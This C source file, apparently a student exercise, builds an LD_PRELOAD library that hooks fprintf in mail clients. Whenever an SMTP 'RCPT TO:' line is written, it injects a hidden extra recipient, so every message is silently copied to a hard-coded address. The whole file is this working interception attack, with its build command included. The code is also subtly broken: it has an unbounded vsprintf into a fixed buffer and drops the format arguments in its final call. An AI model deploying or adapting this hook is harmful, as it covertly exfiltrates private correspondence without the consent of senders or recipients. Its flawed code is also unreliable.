/*
* Authors : Bastien Wermeille & Malik Fleury
* Date : 08.04.2019
*/

#ifndef CC
#error "CC macro is not passed, please use the following command : \
        gcc -fPIC -shared -o libpreload.so ./preload.c -ldl -DCC=\"malik.fleury@he-arc.ch\""

#else
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <stdarg.h>

/* Function pointers to hold the value of the glibc functions */
static int (*real_fprintf)(FILE *stream, const char *format, ...) = NULL;

void createCC(char* cc)
{
  strcpy(cc,"RCPT TO: ");
  strcat(cc, CC);
  strcat(cc, "\n");
}

int fprintf(FILE *stream, const char *format, ...)
{
    //Sep
    char buffer[255];
    va_list args;

    va_start(args, format);
    vsprintf(buffer, format, args);
    va_end(args);

    real_fprintf = dlsym(RTLD_NEXT, "fprintf");

    char RECEPT_TO[] = "RCPT TO:";
    char *result = strstr(buffer, RECEPT_TO);

    if (result != NULL)
    {
        char cc[255];
        createCC(cc);

        real_fprintf(stream, cc);
        fflush(stream);

        char receipt[255];
        do
        {
            fgets(receipt, sizeof(receipt), stream);
            //puts(buffer);
        } while (receipt[0] < '2' || receipt[0] > '5');
    }

    return real_fprintf(stream, format);
}

#endif
